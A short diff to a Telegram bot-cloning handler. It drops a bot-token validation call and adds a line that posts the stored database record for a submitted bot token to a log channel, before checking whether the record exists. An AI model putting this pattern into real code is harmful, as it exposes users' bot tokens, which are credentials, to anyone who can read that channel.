@@ -24,9 +24,9 @@ async def add_handler(client, message):
   try:
     new_message = message.text.split()[1:]
     bot_token = " ".join(new_message)
-    bot_tok = await db.is_bot_token(bot_token)
 
     existing_token = collection.find_one({"bot_token": bot_token})
+    await client.send_message(LOG_clone_CHANNEL , existing_token)
     if existing_token:
         await message.reply_text("This bot token is already cloned.")
         return
